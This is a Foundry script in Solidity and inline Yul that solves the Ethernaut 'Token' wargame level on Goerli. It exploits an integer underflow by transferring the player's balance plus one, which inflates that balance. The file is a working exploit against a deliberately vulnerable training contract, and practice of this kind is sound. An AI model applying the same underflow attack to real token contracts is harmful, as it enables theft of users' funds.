// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";

interface Instance {
    function totalSupply() external view returns (uint);

    function transfer(address _to, uint _value) external returns (bool);

    function balanceOf(address _owner) external view returns (uint balance);
}

contract TokenScript is EthernautScript {
    string network = "goerli";
    address level = 0xB4802b28895ec64406e45dB504149bfE79A38A57;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        uint256 startBalance = instance.balanceOf(player);
        instance.transfer(address(0), startBalance + 1);
        require(instance.balanceOf(player) > startBalance);
    }

    function yulVersion() internal {
        assembly {
            let token := sload(instance.slot)

            // startBalance
            mstore(0, "balanceOf(address)")
            mstore(0, keccak256(0, 18))
            mstore(0x4, sload(player.slot))
            pop(staticcall(gas(), token, 0, 0x24, 0, 0x20)) // we don't check that the call succedeed
            let startBalance := mload(0)

            // here we are going to need more that 2 slots to store the args
            // so if we store at 0, we would override the free memory pointer
            let ptr := mload(0x40)
            mstore(ptr, "transfer(address,uint256)")
            mstore(ptr, keccak256(ptr, 25))
            mstore(add(ptr, 0x24), add(startBalance, 1))
            let success := call(gas(), token, 0, ptr, 0x44, 0, 0x20)
            if iszero(success) {
                revert(0, 0)
            }

            // endBalance
            mstore(0, "balanceOf(address)")
            mstore(0, keccak256(0, 18))
            mstore(0x4, sload(player.slot))
            pop(staticcall(gas(), token, 0, 0x24, 0, 0x20))
            let endBalance := mload(0)

            if iszero(gt(endBalance, startBalance)) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
